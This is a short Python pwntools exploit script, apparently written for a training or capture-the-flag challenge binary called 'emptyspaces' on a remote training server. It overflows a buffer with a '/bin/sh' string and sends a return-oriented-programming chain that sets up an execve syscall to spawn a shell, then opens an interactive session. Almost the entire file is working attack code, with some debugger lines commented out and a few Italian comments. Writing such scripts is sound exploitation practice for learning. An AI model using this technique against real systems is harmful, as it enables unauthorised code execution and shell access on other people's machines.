from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# r = process("./emptyspaces")
# gdb.attach(r,'''
# b * 0x400c13
# ''')

r = remote("bin.training.offdef.it", 4006)

asm_code = """
mov rdi, rax
add rdi, 16
mov rax, 0x3b
syscall
"""

context.arch = 'amd64'
stringa = b"/bin/sh" + b"\x00"


shellcode = asm(asm_code)

input("wait")
r.send(b"A"*4 + stringa + b"A"*60)

#sommer per /bin/sh

#add 8
#r.send(p64(4373113,endian='little'))

r.send(p64(4373083,endian='little'))

# r.send(p64(4722207,endian='little'))
# r.send(p64(4722207,endian='little'))

#pop rax, rdx, rbx
r.send(p64(4725825,endian='little')) 
r.send(p64(59,endian='little')) #0x3b
r.send(p64(0))
r.send(p64(0))

#pop rsi
r.send(p64(4504922,endian='little')) 
r.send(p64(0))

#syscall
r.send(p64(4199052,endian='little')) 



r.interactive()